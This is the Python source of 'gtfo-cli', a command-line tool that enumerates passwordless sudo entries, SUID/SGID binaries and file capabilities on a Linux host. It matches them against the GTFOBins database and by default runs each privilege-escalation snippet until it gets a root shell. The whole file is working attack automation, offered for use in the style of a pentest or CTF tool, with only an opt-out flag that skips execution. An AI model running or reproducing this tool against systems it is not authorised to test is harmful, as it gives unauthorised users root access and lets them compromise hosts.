"""gtfo-cli - map local SUID/SGID + capabilities + sudo -l to GTFOBins
privesc entries, auto-run each exploit, and report whether root was obtained."""
from __future__ import annotations

import argparse
import io
import os
import re
import shlex
import shutil
import stat
import subprocess
import sys
import tarfile
import urllib.request
from pathlib import Path

import yaml

GTFO_BASE = "https://gtfobins.github.io/gtfobins"
TARBALL_URL = (
    "https://codeload.github.com/GTFOBins/GTFOBins.github.io/tar.gz/refs/heads/master"
)

_TTY = sys.stdout.isatty() and os.environ.get("NO_COLOR") is None
_ANSI_RE = re.compile(r"\033\[[0-9;]*m")

# Column order for the context table (local-privesc focused)
LOCAL_CONTEXTS = ("unprivileged", "sudo", "suid", "limited-suid", "capabilities")


def c(text: str, code: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _TTY else text


# ---------------------------------------------------------------------------
# DB location
# ---------------------------------------------------------------------------
def db_dir() -> Path:
    override = os.environ.get("GTFO_DB")
    if override:
        return Path(override)
    base = os.environ.get("XDG_DATA_HOME", str(Path.home() / ".local" / "share"))
    return Path(base) / "gtfo-cli"


def bin_dir() -> Path:
    return db_dir() / "_gtfobins"


BANNER = r"""
   ██████╗ ████████╗███████╗ ██████╗       ██████╗██╗     ██╗
  ██╔════╝ ╚══██╔══╝██╔════╝██╔═══██╗     ██╔════╝██║     ██║
  ██║  ███╗   ██║   █████╗  ██║   ██║     ██║     ██║     ██║
  ██║   ██║   ██║   ██╔══╝  ██║   ██║     ██║     ██║     ██║
  ╚██████╔╝   ██║   ██║     ╚██████╔╝     ╚██████╗███████╗██║
   ╚═════╝    ╚═╝   ╚═╝      ╚═════╝       ╚═════╝╚══════╝╚═╝
"""


def banner() -> str:
    tagline = "                       created by Exript"
    return c(BANNER, "36") + c(tagline, "90") + "\n"


# ---------------------------------------------------------------------------
# GTFObins DB
# ---------------------------------------------------------------------------
def update_db() -> bool:
    print(c("[*]", "34"), "Fetching GTFObins DB...")
    try:
        req = urllib.request.Request(TARBALL_URL, headers={"User-Agent": "gtfo-cli"})
        with urllib.request.urlopen(req, timeout=30) as resp:
            data = resp.read()
    except Exception as exc:
        print(c("[-]", "31"), f"Download failed: {exc}")
        print("    Offline target? Copy a cached DB and set $GTFO_DB.")
        return False

    target = bin_dir()
    if target.exists():
        shutil.rmtree(target)
    db_dir().mkdir(parents=True, exist_ok=True)

    with tarfile.open(fileobj=io.BytesIO(data), mode="r:gz") as tar:
        for member in tar.getmembers():
            parts = member.name.split("/")
            if len(parts) >= 3 and parts[1] == "_gtfobins" and member.isfile():
                member.name = parts[-1]
                tar.extract(member, target)  # noqa: S202

    count = len(list(target.iterdir()))
    print(c("[+]", "32"), f"DB ready: {count} binaries -> {target}")
    return True


def ensure_db() -> bool:
    if bin_dir().is_dir() and any(bin_dir().iterdir()):
        return True
    return update_db()


# ---------------------------------------------------------------------------
# GTFOBins parsing
# ---------------------------------------------------------------------------
def load_binary_doc(binary: str) -> dict | None:
    path = bin_dir() / binary
    if not path.is_file():
        return None
    try:
        return yaml.safe_load(path.read_text(encoding="utf-8")) or {}
    except yaml.YAMLError:
        return None


def structured_functions(doc: dict) -> dict[str, dict[str, str]]:
    """{function_name: {context_name: code_snippet}}."""
    result: dict[str, dict[str, str]] = {}
    for fname, fbody in (doc.get("functions") or {}).items():
        entries = fbody if isinstance(fbody, list) else [fbody]
        ctx_map: dict[str, str] = {}
        for entry in entries:
            if not isinstance(entry, dict):
                continue
            contexts = entry.get("contexts")
            if not isinstance(contexts, dict):
                continue
            for ctx_name, ctx_body in contexts.items():
                if not isinstance(ctx_name, str):
                    continue
                code = ""
                if isinstance(ctx_body, dict):
                    code = ctx_body.get("code", "") or ""
                elif isinstance(ctx_body, str):
                    code = ctx_body
                if code and ctx_name not in ctx_map:
                    ctx_map[ctx_name] = code.strip()
        if ctx_map:
            result[fname] = ctx_map
    return result


# ---------------------------------------------------------------------------
# Table renderer
# ---------------------------------------------------------------------------
def render_table(rows, headers) -> None:
    if not rows:
        return
    widths = [len(_ANSI_RE.sub("", str(h))) for h in headers]
    for row in rows:
        for i, cell in enumerate(row):
            clean = _ANSI_RE.sub("", str(cell))
            widths[i] = max(widths[i], len(clean))
    sep = "+" + "+".join("-" * (w + 2) for w in widths) + "+"
    print(sep)
    print("|" + "|".join(f" {h.ljust(w)} " for h, w in zip(headers, widths)) + "|")
    print(sep)
    for row in rows:
        cells = []
        for cell, w in zip(row, widths):
            s = str(cell)
            clean = _ANSI_RE.sub("", s)
            pad = " " * (w - len(clean))
            cells.append(f" {s}{pad} ")
        print("|" + "|".join(cells) + "|")
    print(sep)


def display_context_table(binary: str, doc: dict, matched_contexts) -> None:
    funcs = structured_functions(doc)
    if not funcs:
        return
    all_ctx = set()
    for ctx_map in funcs.values():
        all_ctx |= set(ctx_map)
    order = [ctx for ctx in LOCAL_CONTEXTS if ctx in all_ctx]
    for ctx in sorted(all_ctx):
        if ctx not in order:
            order.append(ctx)

    headers = ["function"] + order
    rows = []
    for fname in sorted(funcs):
        ctx_map = funcs[fname]
        row = [fname]
        for ctx in order:
            if ctx in ctx_map:
                if ctx in matched_contexts:
                    row.append(c("YES", "1;32"))   # matched — green
                else:
                    row.append(c("ok", "36"))      # present — cyan
            else:
                row.append(c("-", "90"))
        rows.append(row)
    render_table(rows, headers)


# ---------------------------------------------------------------------------
# Exploit execution (PTY-aware)
# ---------------------------------------------------------------------------
def build_command(binary_path: str, code: str) -> str:
    binary = os.path.basename(binary_path)
    code = code.strip()
    for pat in (rf"^\./{re.escape(binary)}\b", rf"^{re.escape(binary)}\b"):
        if re.search(pat, code):
            return re.sub(pat, binary_path, code, count=1)
    return code


def _run_with_pty(command: str, timeout: int) -> tuple[bool, str]:
    """Run command inside a pty (via `script`) so /dev/tty works, feeding
    it `id` and `exit`. Returns (is_root, combined_output)."""
    wrapped = (
        f"printf 'id\\nexit\\n' | "
        f"script -qc {shlex.quote(command)} /dev/null"
    )
    return _run(wrapped, timeout)


def _run_with_pipe(command: str, timeout: int) -> tuple[bool, str]:
    wrapped = f"printf 'id\\nexit\\n' | /bin/sh -c {shlex.quote(command)}"
    return _run(wrapped, timeout)


def _run(wrapped: str, timeout: int) -> tuple[bool, str]:
    try:
        proc = subprocess.Popen(
            ["/bin/sh", "-c", wrapped],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.DEVNULL,
            text=True,
        )
    except OSError as exc:
        return False, f"spawn failed: {exc}"
    try:
        out, err = proc.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.kill()
        try:
            out, err = proc.communicate(timeout=2)
        except Exception:
            out, err = "", ""
    combined = (out or "") + "\n" + (err or "")
    is_root = bool(re.search(r"uid=0\(", combined))
    return is_root, combined


def try_exploit(binary_path: str, code: str, timeout: int = 8,
                prefer_pty: bool = True) -> tuple[bool, str]:
    cmd = build_command(binary_path, code)
    # First try PTY (handles /dev/tty exploits like borg), then pipe.
    if prefer_pty and shutil.which("script"):
        is_root, out = _run_with_pty(cmd, timeout)
        if is_root:
            return True, out
        # If the pty attempt produced literally nothing useful, fall back.
        if out.strip() and "command not found" not in out:
            return False, out
    return _run_with_pipe(cmd, timeout)


# ---------------------------------------------------------------------------
# Host enumeration
# ---------------------------------------------------------------------------
def iter_suid_sgid(root: str = "/"):
    for dirpath, _dirnames, filenames in os.walk(root, onerror=lambda e: None):
        for name in filenames:
            fp = os.path.join(dirpath, name)
            try:
                st = os.lstat(fp)
            except OSError:
                continue
            if not stat.S_ISREG(st.st_mode):
                continue
            if st.st_mode & (stat.S_ISUID | stat.S_ISGID):
                yield fp


def iter_capabilities(root: str = "/"):
    if shutil.which("getcap") is None:
        return
    try:
        out = subprocess.run(
            ["getcap", "-r", root],
            capture_output=True, text=True, timeout=120,
        ).stdout
    except (subprocess.SubprocessError, OSError):
        return
    for line in out.splitlines():
        line = line.strip()
        if not line:
            continue
        path = line.split(" =")[0].split(" cap_")[0].strip()
        yield path, line


_SUDO_LINE_RE = re.compile(r"\([^)]*\)\s+NOPASSWD:\s*(.*)$")


def iter_sudo_l():
    """Yield binary paths allowed via `sudo` without a password."""
    if shutil.which("sudo") is None:
        return
    try:
        res = subprocess.run(
            ["sudo", "-n", "-l"],
            capture_output=True, text=True, timeout=10,
        )
    except Exception:
        return
    out = (res.stdout or "") + "\n" + (res.stderr or "")
    for line in out.splitlines():
        m = _SUDO_LINE_RE.match(line)
        if not m:
            continue
        for entry in m.group(1).split(","):
            entry = entry.strip()
            if not entry or entry.upper().startswith("ALL"):
                continue
            path = entry.split()[0]
            if path.startswith("/") and os.path.exists(path):
                yield path


# ---------------------------------------------------------------------------
# Reporting
# ---------------------------------------------------------------------------
def report(binary: str, binary_path: str, contexts, run_exploit: bool,
           timeout: int, results: list) -> tuple[bool, bool]:
    """Show table + optionally run exploit. Returns (matched, got_root)."""
    doc = load_binary_doc(binary)
    if not doc:
        return False, False
    funcs = structured_functions(doc)
    if not funcs:
        return False, False

    matches: list[tuple[str, str, str]] = []
    for fname in sorted(funcs):
        ctx_map = funcs[fname]
        for ctx in contexts:
            if ctx in ctx_map and ctx_map[ctx]:
                matches.append((fname, ctx, ctx_map[ctx]))
    if not matches:
        return False, False

    print(f"\n  {c('[+]', '32')} {c(binary, '1;33')}  {c(binary_path, '90')}")
    display_context_table(binary, doc, contexts)

    got_root = False
    for fname, ctx, code in matches:
        link = f"{GTFO_BASE}/{binary}/#{fname}"
        first_line = code.splitlines()[0] if code.splitlines() else code
        print(
            f"    {c('->', '36')} "
            f"{c(ctx, '35'):18s} {c(fname, '36'):12s} "
            f"{c(first_line, '90')}"
        )
        print(f"       {c('link:', '90')} {c(link, '34')}")

        if not run_exploit:
            results.append({
                "binary": binary, "context": ctx, "func": fname,
                "success": None, "cmd": build_command(binary_path, code),
                "output": "(skipped)",
            })
            continue

        print(f"       {c('[*] running exploit...', '34')}")
        is_root, output = try_exploit(binary_path, code, timeout=timeout)
        results.append({
            "binary": binary, "context": ctx, "func": fname,
            "success": is_root, "cmd": build_command(binary_path, code),
            "output": output,
        })

        if is_root:
            print(
                f"       {c('>>> ROOT OBTAINED via', '1;32')} "
                f"{c(binary, '1;33')} [{ctx}/{fname}] "
                f"{c('<<<', '1;32')}"
            )
            print(c("       --- id output ---", "32"))
            for line in output.splitlines():
                if "uid=" in line or "gid=" in line:
                    print(f"       {c(line, '32')}")
                    break
            got_root = True
            break
        else:
            hint = output.strip().splitlines()[-1] if output.strip() else "(no output)"
            print(f"       {c('no root', '31')}: {hint[:120]}")

    return True, got_root


def print_summary(results: list) -> None:
    if not results:
        return
    print("\n" + c("[*]", "34"), "Exploit summary:")
    rows = []
    for r in results:
        if r["success"] is True:
            status = c("ROOT", "1;32")
        elif r["success"] is False:
            status = c("no root", "31")
        else:
            status = c("skipped", "90")
        cmd = r["cmd"]
        if len(cmd) > 60:
            cmd = cmd[:57] + "..."
        rows.append([r["binary"], r["context"], r["func"], status, cmd])
    render_table(rows, ["binary", "context", "func", "result", "command"])


# ---------------------------------------------------------------------------
# Main scan
# ---------------------------------------------------------------------------
def run_scan(root: str, run_exploit: bool, timeout: int) -> int:
    if not ensure_db():
        return 1

    results: list = []
    hit = False
    got_root = False

    # ---- 1. sudo -l ----
    print("\n" + c("[*]", "34"), "Parsing `sudo -n -l` for NOPASSWD entries...")
    print(c(">>> sudo matches (context: sudo):", "1"))
    sudo_seen: set[str] = set()
    if shutil.which("sudo") is None:
        print("  " + c("[!]", "33"), "sudo not found.")
    else:
        any_entry = False
        for path in iter_sudo_l():
            any_entry = True
            b = os.path.basename(path)
            if b in sudo_seen:
                continue
            sudo_seen.add(b)
            m, r = report(b, path, ("sudo",), run_exploit, timeout, results)
            hit = hit or m
            got_root = got_root or r
            if r:
                break
        if not any_entry and not got_root:
            print("  " + c("[i]", "90"),
                  "no NOPASSWD sudo entries found (or password required).")

    # ---- 2. SUID / SGID ----
    if not got_root:
        print("\n" + c("[*]", "34"), "Enumerating SUID/SGID binaries...")
        print(c(">>> SUID/SGID matches (context: suid / limited-suid):", "1"))
        seen: set[str] = set()
        for fp in iter_suid_sgid(root):
            b = os.path.basename(fp)
            if b in seen:
                continue
            seen.add(b)
            m, r = report(b, fp, ("suid", "limited-suid"),
                          run_exploit, timeout, results)
            hit = hit or m
            got_root = got_root or r
            if r:
                break

    # ---- 3. capabilities ----
    if not got_root:
        print("\n" + c("[*]", "34"), "Enumerating file capabilities (getcap)...")
        print(c(">>> Capabilities matches (context: capabilities):", "1"))
        if shutil.which("getcap") is None:
            print("  " + c("[!]", "33"), "getcap not found -> apt install libcap2-bin")
        else:
            seen = set()
            for fp, _caps in iter_capabilities(root):
                b = os.path.basename(fp)
                if b in seen:
                    continue
                seen.add(b)
                m, r = report(b, fp, ("capabilities",),
                              run_exploit, timeout, results)
                hit = hit or m
                got_root = got_root or r
                if r:
                    break

    print_summary(results)
    print()
    if got_root:
        print(c("[!] ROOT OBTAINED — see the summary above.", "1;32"))
    elif hit:
        print(c("Happy Hack Day ^-^", "32"))
    else:
        print("No exploitable GTFOBins entries found :(")
    return 0


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(
        prog="gtfo-cli",
        description="Map sudo/suid/sgid/capabilities to GTFOBins and auto-exploit.",
    )
    parser.add_argument("--update", action="store_true",
                        help="(re)download the offline GTFOBins DB and exit")
    parser.add_argument("--root", default="/",
                        help="filesystem root to scan (default: /)")
    parser.add_argument("--no-banner", action="store_true")
    parser.add_argument("--no-run", action="store_true",
                        help="show GTFOBins tables only; do not run exploits")
    parser.add_argument("--timeout", type=int, default=8,
                        help="timeout per exploit attempt in seconds (default: 8)")
    args = parser.parse_args(argv)

    if not args.no_banner:
        print(banner())

    if args.update:
        return 0 if update_db() else 1
    return run_scan(args.root, run_exploit=not args.no_run, timeout=args.timeout)


if __name__ == "__main__":
    sys.exit(main())
